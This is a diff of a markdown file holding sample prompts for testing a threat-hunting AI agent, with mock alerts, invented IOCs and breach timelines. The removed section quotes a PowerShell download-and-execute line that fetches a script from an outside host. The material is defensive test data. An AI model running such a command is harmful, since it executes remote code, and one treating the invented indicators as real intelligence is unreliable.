@@ -1,102 +1,39 @@
 ## Sample Prompt Used to Test the Agent
 
-The following prompt was used to evaluate the agent’s ability to process a high-pressure, enterprise-style threat hunting scenario. It was designed to simulate a real-world Falcon alert escalation involving suspected advanced persistent threat activity in a financial services environment.
+I need you to analyze three different pieces of intelligence I've collected. Can you extract the IOCs and provide hunting queries for each?
 
-This sample tests whether the agent can:
-- extract indicators of compromise from mixed security artifacts
-- reason over operational context
-- map activity to MITRE ATT&CK
-- generate hunting queries for multiple platforms
-- support incident response under time pressure
+**Case 1:** Found this list in a threat report, need IOCs extracted:
+192.168.1.100
+malware-c2.example.com
+http://phishing-site.net/login
+d41d8cd98f00b204e9800998ecf8427e
+bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Malware
 
-### Sample Threat Hunting Prompt
+**Case 2:** Suspicious activity from our SIEM logs today:
+2024-03-06 14:23:15 DNS Query: suspicious-domain.tk A record requested by 10.0.0.45
+2024-03-06 14:23:18 HTTP Connection: 10.0.0.45 -> 185.220.101.42:443 (SSL/TLS)
+2024-03-06 14:23:22 File Created: C:\Users\john\AppData\Temp\update.exe (SHA256: 7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730)
+2024-03-06 14:23:25 Registry Modified: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
+2024-03-06 14:23:30 Network Connection: update.exe -> 203.0.113.45:8080
 
-```text
-FALCON ALERT: ADVANCED PERSISTENT THREAT ACTIVITY DETECTED
-==========================================================
+**Case 3:** Major incident we're investigating - need full analysis:
+INCIDENT REPORT: Breach Investigation - Finance Department
 
-Alert ID: FCS-2024-1215-7439
-Severity: CRITICAL
-Customer: Fortune 500 Financial Services Client
-Analyst: [Your Name]
-Escalation Level: Tier 3 - Advanced Threat Hunting Required
+Timeline:
+- 2024-02-28 09:15: Employee received email with attachment "Invoice_Q1_2024.docx" 
+- 2024-02-28 09:22: Malicious macro executed, dropped payload (SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456)
+- 2024-02-28 09:25: Scheduled task created "SystemHealthCheck"
+- 2024-02-28 09:30: Outbound connection to 203.0.113.45:443 (SSL encrypted)
+- 2024-03-01 02:00: WMI activity targeting DC01.finance.corp (10.0.1.10)
+- 2024-03-01 02:15: lsass.exe memory access detected
+- 2024-03-05 03:00: Large files moved to C:\Windows\Temp\backup\
+- 2024-03-05 03:30: Encrypted traffic to backup-server.darkweb.onion
+- 2024-03-06 01:00: New domains observed: staging1.malicious-infra.com, staging2.malicious-infra.com
 
-INITIAL DETECTION SUMMARY:
--------------------------
-Falcon EDR triggered multiple behavioral detections across customer environment:
-- Machine Learning: Suspicious PowerShell execution patterns
-- IOA: Process injection into legitimate Windows processes
-- Network: Anomalous C2 communication patterns
-- File Analysis: Unknown executable with suspicious entropy
-
-CUSTOMER ENVIRONMENT:
---------------------
-- 15,000+ endpoints (Windows 10/11, Server 2019/2022)
-- Hybrid cloud infrastructure (Azure + on-premises)
-- Financial trading applications and sensitive data
-- Previous targeting by WIZARD SPIDER and SCATTERED SPIDER
-
-TECHNICAL ARTIFACTS REQUIRING IOC EXTRACTION:
---------------------------------------------
-
-PowerShell Command Line (Base64 Decoded):
-IEX (New-Object Net.WebClient).DownloadString('http://cdn-updates.financial-services-portal.org/scripts/update.ps1'); Start-Process -FilePath "C:\Windows\System32\svchost.exe" -ArgumentList "-k netsvcs -p -s UpdateOrchestrator" -WindowStyle Hidden
-
-Network Connections (Falcon Network Containment):
-- 45.142.212.87:443 (SSL/TLS encrypted)
-- 194.180.48.23:8080 (HTTP POST requests)
-- secure-banking-update.finance-portal.net:443
-- api.legitimate-cloud-service.org:443 (potential domain fronting)
-
-File System Events:
-- C:\Users\jsmith\AppData\Local\Temp\office_update.exe (SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456)
-- C:\Windows\System32\drivers\network_adapter.sys (Unsigned driver, SHA1: 9876543210abcdef9876543210abcdef98765432)
-- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SecurityUpdate.lnk
-
-Registry Modifications:
-- HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
-- HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate
-
-DNS Queries (Suspicious):
-- update-service.microsoft-security.org
-- download.adobe-flash-update.net
-- ns1.backup-sync.enterprise-cloud.com
-- mail.temp-services.tk
-
-Email Artifacts (From customer's email security):
-- Sender: it-security@company-portal.org
-- Attachment: Q4_Financial_Report.pdf.scr
-- Reply-to: noreply@secure-document-viewer.net
-
-FALCON INTELLIGENCE CONTEXT:
----------------------------
-- Similar TTPs observed in recent SCATTERED SPIDER campaigns
-- Infrastructure overlaps with previous financial sector targeting
-- Timing coincides with Q4 earnings season (high-value target period)
-- Customer recently mentioned in underground forums as potential target
-
-HUNTING REQUIREMENTS:
---------------------
-As the assigned threat hunter, I need you to:
-
-1. Extract ALL IOCs from the above artifacts with confidence scoring
-2. Correlate with current threat intelligence and attribute to known threat actors
-3. Map to MITRE ATT&CK framework with specific techniques/sub-techniques
-4. Generate Falcon Query Language (FQL) hunting queries for:
-   - Historical compromise assessment (90-day lookback)
-   - Lateral movement detection
-   - Persistence mechanism identification
-   - Data exfiltration patterns
-5. Cross-reference with other SIEM platforms (customer uses Splunk + Sentinel)
-6. Provide threat actor attribution and campaign correlation
-7. Recommend immediate containment actions and long-term hardening
-
-URGENCY: Customer's trading floor goes live in 6 hours for Asian markets. Need comprehensive IOC package and hunting queries within 30 minutes for emergency response team.
-
-ADDITIONAL CONTEXT:
-- Customer has crown jewel data: trading algorithms, client financial records
-- Previous incidents involved cryptocurrency theft and market manipulation
-- Regulatory compliance requirements (SOX, PCI-DSS) mandate thorough investigation
-- Executive leadership briefing scheduled in 2 hours
-
-Please provide comprehensive IOC analysis with actionable intelligence for immediate threat hunting and incident response.
+Observed techniques:
+- PowerShell execution with encoded commands
+- WMI lateral movement
+- Process hollowing and DLL side-loading
+- 3-week persistence before detection
+- Matches patterns we've seen from state-sponsored groups
